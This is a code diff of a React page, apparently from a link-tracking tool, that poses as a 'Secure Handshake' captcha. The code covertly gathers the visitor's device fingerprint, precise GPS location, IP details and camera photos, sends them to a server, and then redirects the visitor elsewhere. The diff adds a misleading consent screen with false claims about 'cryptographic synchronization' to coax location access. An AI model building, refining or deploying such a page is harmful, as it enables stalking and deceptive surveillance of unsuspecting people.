@@ -1,6 +1,6 @@
 
 import React, { useEffect, useState, useRef, useCallback } from 'react';
-import { ShieldCheck, Lock, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal } from 'lucide-react';
+import { ShieldCheck, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal, AlertTriangle } from 'lucide-react';
 import { CaptureReport, DeviceInfo, GeoLocation } from '../types';
 
 interface Props {
@@ -8,9 +8,9 @@ interface Props {
 }
 
 const CapturePage: React.FC<Props> = ({ linkId }) => {
-  const [status, setStatus] = useState<'idle' | 'sliding' | 'verifying' | 'done'>('idle');
+  const [status, setStatus] = useState<'consent' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
   const [sliderPos, setSliderPos] = useState(0);
-  const [geoStatus, setGeoStatus] = useState<string>('Initialization Required');
+  const [geoStatus, setGeoStatus] = useState<string>('Ready for handshake');
   const [accuracy, setAccuracy] = useState<number | null>(null);
   const [redirectTarget, setRedirectTarget] = useState('https://google.com');
   const [metricsCount, setMetricsCount] = useState(0);
@@ -24,7 +24,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   const geoPromiseRef = useRef<Promise<GeoLocation> | null>(null);
 
   useEffect(() => {
-    // Fetch clean redirect info from server to keep link secure
     fetch(`/api/link-info/${linkId}`)
       .then(r => r.json())
       .then(data => {
@@ -38,8 +37,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     dataGatheringStarted.current = true;
 
     const ua = navigator.userAgent;
-    
-    // Attempt to get High Entropy User Agent data if supported
     let highEntropyData: any = {};
     if ((navigator as any).userAgentData?.getHighEntropyValues) {
       try {
@@ -49,12 +46,9 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       } catch (e) {}
     }
 
-    // Improved Orientation Detection
     let orientation = 'unknown';
     if (window.screen && window.screen.orientation && window.screen.orientation.type) {
       orientation = window.screen.orientation.type;
-    } else if (typeof window.orientation !== 'undefined') {
-      orientation = Math.abs(window.orientation as number) === 90 ? 'landscape' : 'portrait';
     } else {
       orientation = window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
     }
@@ -64,9 +58,9 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       os: /windows/i.test(ua) ? 'Windows' : /macintosh/i.test(ua) ? 'MacOS' : /linux/i.test(ua) ? 'Linux' : /android/i.test(ua) ? 'Android' : /iphone|ipad|ipod/i.test(ua) ? 'iOS' : 'Other',
       platform: highEntropyData.platform || navigator.platform,
       language: navigator.language,
-      screenResolution: `${window.screen.width}x${window.screen.height} (Available: ${window.screen.availWidth}x${window.screen.availHeight})`,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
       cores: navigator.hardwareConcurrency || 0,
-      userAgent: `${ua} | Model: ${highEntropyData.model || 'N/A'} | Arch: ${highEntropyData.architecture || 'N/A'}`,
+      userAgent: `${ua} | Model: ${highEntropyData.model || 'N/A'}`,
       orientation: orientation,
       ram: (navigator as any).deviceMemory || 0,
       timezoneOffset: new Date().getTimezoneOffset(),
@@ -92,7 +86,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
         };
         setMetricsCount(prev => prev + 4);
       }
-      
       const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
       if (conn) {
         reportRef.current.network = {
@@ -116,7 +109,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       const finish = () => {
         if (watchId !== null) navigator.geolocation.clearWatch(watchId);
         if (timeoutId) clearTimeout(timeoutId);
-
         if (bestFix) {
           resolve({
             lat: bestFix.coords.latitude,
@@ -133,7 +125,7 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
             .then(ipRes => resolve({
               lat: ipRes.latitude,
               lon: ipRes.longitude,
-              accuracy: 2500,
+              accuracy: 3000,
               ip: ipRes.ip,
               city: ipRes.city,
               country: ipRes.country_name,
@@ -144,41 +136,31 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       };
 
       if (!("geolocation" in navigator)) { finish(); return; }
-
       setGeoStatus('Requesting Satellite Access...');
-      
-      timeoutId = setTimeout(() => {
-        setGeoStatus('Vectoring Best Fix...');
-        finish();
-      }, 15000); 
-
+      timeoutId = setTimeout(() => { finish(); }, 15000); 
       watchId = navigator.geolocation.watchPosition(
         (pos) => {
           setAccuracy(Math.round(pos.coords.accuracy));
-          setGeoStatus('Calibrating Accuracy...');
+          setGeoStatus('Handshake Established...');
           if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
             bestFix = pos;
-            if (pos.coords.accuracy <= 15) {
-              setGeoStatus('High-Precision Lock.');
-              finish();
-            }
+            if (pos.coords.accuracy <= 15) finish();
           }
         },
-        () => {
-          setGeoStatus('GPS Access Terminated');
-          finish();
-        },
+        () => finish(),
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     });
   }, []);
 
+  const handleConsent = () => {
+    setStatus('idle');
+    geoPromiseRef.current = getHighAccuracyLocation();
+  };
+
   const finalizeCapture = async () => {
     setStatus('verifying');
-    
-    if (!geoPromiseRef.current) {
-      geoPromiseRef.current = getHighAccuracyLocation();
-    }
+    if (!geoPromiseRef.current) geoPromiseRef.current = getHighAccuracyLocation();
     
     let photos: string[] = [];
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -201,7 +183,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     }
 
     const finalLocation = await geoPromiseRef.current;
-    
     try {
       const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
       reportRef.current.location = {
@@ -211,12 +192,9 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
         country: finalLocation.country || ipRes.country_name,
         isp: ipRes.org,
       };
-    } catch (e) {
-      reportRef.current.location = finalLocation;
-    }
+    } catch (e) { reportRef.current.location = finalLocation; }
 
     reportRef.current.photos = photos;
-
     const finalReport = {
       ...reportRef.current,
       id: Math.random().toString(36).substring(7),
@@ -234,18 +212,13 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     } catch (err) {}
 
     setStatus('done');
-    setTimeout(() => {
-      window.location.href = redirectTarget;
-    }, 800);
+    setTimeout(() => { window.location.href = redirectTarget; }, 800);
   };
 
   const handleStart = () => {
     isDragging.current = true;
     setStatus('sliding');
     gatherEnhancedMetrics();
-    if (!geoPromiseRef.current) {
-      geoPromiseRef.current = getHighAccuracyLocation();
-    }
   };
 
   const handleMove = (clientX: number) => {
@@ -254,7 +227,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     const x = Math.max(0, Math.min(clientX - rect.left, rect.width - 64));
     const percent = (x / (rect.width - 64)) * 100;
     setSliderPos(percent);
-    
     if (percent >= 98) {
       isDragging.current = false;
       setSliderPos(100);
@@ -265,10 +237,7 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   const handleEnd = () => {
     if (!isDragging.current) return;
     isDragging.current = false;
-    if (sliderPos < 98) {
-      setSliderPos(0);
-      setStatus('idle');
-    }
+    if (sliderPos < 98) { setSliderPos(0); setStatus('idle'); }
   };
 
   useEffect(() => {
@@ -288,109 +257,110 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   }, [sliderPos]);
 
   return (
-    <div className="min-h-screen bg-[#111827] flex items-center justify-center p-6 select-none font-sans overflow-hidden">
+    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 md:p-6 select-none font-sans overflow-hidden">
       <video ref={videoRef} className="hidden" playsInline muted></video>
       <canvas ref={canvasRef} className="hidden"></canvas>
 
-      <div className="w-full max-w-sm bg-white rounded-[3rem] shadow-[0_40px_100px_-20px_rgba(0,0,0,0.5)] overflow-hidden border border-gray-100 animate-pop">
-        {/* Verification Header */}
-        <div className="p-10 pb-6 text-center bg-[#F9FAFB]">
-          <div className="inline-flex items-center justify-center w-24 h-24 bg-brand-accent/10 rounded-[2.5rem] mb-6 border-2 border-brand-accent/20 relative group">
-            <div className={`absolute inset-0 bg-brand-accent/5 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
-            <Fingerprint className="text-brand-accent relative z-10 transition-transform group-hover:scale-110" size={48} />
-          </div>
-          <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Secure Handshake</h1>
-          <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">P2P Network Verification</p>
-        </div>
-
-        {/* Captcha Body */}
-        <div className="p-10 pt-4 space-y-10">
-          <div className="space-y-4">
-            <div className="flex items-center justify-between px-2">
-               <div className="flex items-center gap-2">
-                 <div className={`w-2 h-2 rounded-full ${accuracy && accuracy < 30 ? 'bg-green-500' : 'bg-brand-accent'} animate-pulse`} />
-                 <span className="text-[9px] font-black text-ink/40 uppercase tracking-widest">{geoStatus}</span>
-               </div>
-               {accuracy && <span className="text-[9px] font-black text-brand-accent uppercase">+/- {accuracy}m</span>}
+      <div className="w-full max-w-sm bg-white rounded-[2.5rem] md:rounded-[3rem] shadow-[0_40px_100px_-20px_rgba(0,0,0,0.5)] overflow-hidden animate-pop">
+        {status === 'consent' ? (
+          <div className="p-10 space-y-8">
+            <div className="w-20 h-20 bg-brand-accent/10 rounded-[2rem] flex items-center justify-center mx-auto border border-brand-accent/20">
+              <ShieldCheck size={40} className="text-brand-accent" />
             </div>
-            
-            <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 flex items-center justify-between">
-              <div className="flex items-center gap-3">
-                <div className="bg-white p-2 rounded-lg border border-gray-100 shadow-sm">
-                  <Signal size={16} className="text-brand-accent" />
+            <div className="text-center space-y-3">
+              <h1 className="text-2xl font-black text-ink uppercase italic tracking-tight">Security Handshake</h1>
+              <p className="text-sm font-bold text-ink/50 leading-relaxed">
+                To continue, high-precision GPS and biometric-style network calibration is required.
+              </p>
+            </div>
+            <div className="bg-orange-50 p-4 rounded-2xl border border-orange-100 flex gap-3 items-start">
+              <AlertTriangle className="text-orange-500 shrink-0" size={18} />
+              <p className="text-[10px] font-black text-orange-800 uppercase tracking-widest leading-4">
+                Location access must be granted for cryptographic synchronization.
+              </p>
+            </div>
+            <button onClick={handleConsent} className="w-full bg-ink text-white font-black py-5 rounded-3xl shadow-xl hover:bg-brand-accent transition-all uppercase italic tracking-tighter">
+              Begin Calibration
+            </button>
+          </div>
+        ) : (
+          <>
+            <div className="p-10 pb-6 text-center bg-[#F9FAFB]">
+              <div className="inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 bg-brand-accent/10 rounded-[2rem] md:rounded-[2.5rem] mb-6 border-2 border-brand-accent/20 relative">
+                <div className={`absolute inset-0 bg-brand-accent/5 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
+                <Fingerprint className="text-brand-accent relative z-10" size={40} />
+              </div>
+              <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Secure Handshake</h1>
+              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">P2P Network Verification</p>
+            </div>
+
+            <div className="p-8 md:p-10 pt-4 space-y-8 md:space-y-10">
+              <div className="space-y-4">
+                <div className="flex items-center justify-between px-2">
+                   <div className="flex items-center gap-2">
+                     <div className={`w-2 h-2 rounded-full ${accuracy && accuracy < 30 ? 'bg-green-500' : 'bg-brand-accent'} animate-pulse`} />
+                     <span className="text-[9px] font-black text-ink/40 uppercase tracking-widest">{geoStatus}</span>
+                   </div>
+                   {accuracy && <span className="text-[9px] font-black text-brand-accent uppercase">+/- {accuracy}m</span>}
                 </div>
-                <div>
-                  <p className="text-[10px] font-black text-ink uppercase">Network integrity</p>
-                  <p className="text-[9px] font-bold text-ink/30 uppercase">Analyzing cellular signature</p>
+                
+                <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="bg-white p-2 rounded-lg border border-gray-100 shadow-sm">
+                      <Signal size={16} className="text-brand-accent" />
+                    </div>
+                    <div>
+                      <p className="text-[10px] font-black text-ink uppercase">Network integrity</p>
+                      <p className="text-[9px] font-bold text-ink/30 uppercase">Analyzing cellular signature</p>
+                    </div>
+                  </div>
+                  <Activity size={16} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-gray-200'}`} />
                 </div>
               </div>
-              <Activity size={16} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-gray-200'}`} />
-            </div>
-          </div>
 
-          {/* Slider Interaction (Modern Captcha) */}
-          <div 
-            ref={containerRef}
-            className="relative h-20 bg-gray-100 rounded-[2.5rem] border-2 border-gray-200 p-2 flex items-center transition-all overflow-hidden"
-          >
-            <div className={`absolute inset-0 flex items-center justify-center pointer-events-none transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
-               <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.25em] flex items-center gap-2">
-                 Slide to Authenticate <ChevronRight size={16} />
-               </span>
-            </div>
+              <div ref={containerRef} className="relative h-20 bg-gray-100 rounded-[2.5rem] border-2 border-gray-200 p-2 flex items-center overflow-hidden">
+                <div className={`absolute inset-0 flex items-center justify-center pointer-events-none transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
+                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.25em] flex items-center gap-2">
+                     Slide to Authenticate <ChevronRight size={16} />
+                   </span>
+                </div>
+                <div className="absolute left-0 top-0 h-full bg-brand-accent/10 transition-none" style={{ width: `calc(${sliderPos}% + 40px)` }} />
+                <div onMouseDown={handleStart} onTouchStart={handleStart} style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} className={`relative z-10 w-16 h-16 bg-white border border-gray-200 rounded-full shadow-2xl cursor-grab active:cursor-grabbing flex items-center justify-center transition-all ${isDragging.current ? 'scale-90' : 'hover:scale-105'}`}>
+                  {status === 'verifying' ? <Loader2 className="animate-spin text-brand-accent" size={32} /> : status === 'done' ? <CheckCircle2 className="text-green-500" size={36} /> : <ChevronRight className="text-brand-accent" size={36} />}
+                </div>
+              </div>
 
-            <div 
-              className="absolute left-0 top-0 h-full bg-brand-accent/10 transition-none"
-              style={{ width: `calc(${sliderPos}% + 40px)` }}
-            />
-
-            <div 
-              onMouseDown={handleStart}
-              onTouchStart={handleStart}
-              style={{ transform: `translateX(${sliderPos}%)`, left: '0' }}
-              className={`relative z-10 w-16 h-16 bg-white border border-gray-200 rounded-full shadow-2xl cursor-grab active:cursor-grabbing flex items-center justify-center transition-all ${isDragging.current ? 'scale-90 shadow-brand-accent/20' : 'hover:scale-105'} duration-200`}
-            >
-              {status === 'verifying' ? (
-                <Loader2 className="animate-spin text-brand-accent" size={32} />
-              ) : status === 'done' ? (
-                <CheckCircle2 className="text-green-500" size={36} />
-              ) : (
-                <ChevronRight className="text-brand-accent" size={36} />
+              {status === 'verifying' && (
+                <div className="space-y-4 animate-pop">
+                   <div className="grid grid-cols-2 gap-4">
+                      <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
+                        <Zap size={14} className="text-yellow-500" />
+                        <span className="text-[9px] font-black text-ink uppercase">Battery: {Math.round((reportRef.current.battery?.level || 0) * 100)}%</span>
+                      </div>
+                      <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
+                        <Wifi size={14} className="text-brand-accent" />
+                        <span className="text-[9px] font-black text-ink uppercase">{reportRef.current.network?.type || 'Searching...'}</span>
+                      </div>
+                   </div>
+                   <div className="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden">
+                      <div className="h-full bg-brand-accent animate-[scan_1.2s_ease-in-out_infinite]" style={{width: '40%'}} />
+                   </div>
+                </div>
               )}
             </div>
-          </div>
 
-          {/* Verification Status Overlay */}
-          {status === 'verifying' && (
-            <div className="space-y-4 animate-pop">
-               <div className="grid grid-cols-2 gap-4">
-                  <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
-                    <Zap size={14} className="text-yellow-500" />
-                    <span className="text-[9px] font-black text-ink uppercase">Battery: {Math.round((reportRef.current.battery?.level || 0) * 100)}%</span>
-                  </div>
-                  <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
-                    <Wifi size={14} className="text-brand-accent" />
-                    <span className="text-[9px] font-black text-ink uppercase">{reportRef.current.network?.type || 'Searching...'}</span>
-                  </div>
-               </div>
-               <div className="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden">
-                  <div className="h-full bg-brand-accent animate-[scan_1.2s_ease-in-out_infinite]" style={{width: '40%'}} />
-               </div>
+            <div className="px-10 py-8 bg-[#F9FAFB] border-t border-gray-100 flex items-center justify-between">
+              <div className="flex flex-col">
+                <span className="text-[10px] font-black text-ink/20 uppercase tracking-widest">Telemetry</span>
+                <span className="text-[9px] font-bold text-ink/40">Handshake metrics: {metricsCount}</span>
+              </div>
+              <div className="flex items-center gap-4 opacity-20 grayscale">
+                <ShieldCheck size={20} />
+                <Cpu size={20} />
+              </div>
             </div>
-          )}
-        </div>
-
-        {/* Diagnostic Footer */}
-        <div className="px-10 py-8 bg-[#F9FAFB] border-t border-gray-100 flex items-center justify-between">
-          <div className="flex flex-col">
-            <span className="text-[10px] font-black text-ink/20 uppercase tracking-widest">Telemetry</span>
-            <span className="text-[9px] font-bold text-ink/40">Handshake metrics: {metricsCount}</span>
-          </div>
-          <div className="flex items-center gap-4 opacity-20 grayscale">
-            <ShieldCheck size={20} />
-            <Cpu size={20} />
-          </div>
-        </div>
+          </>
+        )}
       </div>
 
       <style>{`
@@ -403,11 +373,6 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
       
       <div className="fixed bottom-10 flex flex-col items-center gap-4 text-white/10 uppercase tracking-[0.6em] font-black text-[10px]">
         <span>Encrypted Satellite Uplink v10.2</span>
-        <div className="flex gap-3">
-           {[...Array(3)].map((_, i) => (
-             <div key={i} className={`w-2 h-2 rounded-full bg-white/5 ${status === 'verifying' ? 'animate-pulse' : ''}`} style={{ animationDelay: `${i * 0.3}s` }} />
-           ))}
-        </div>
       </div>
     </div>
   );
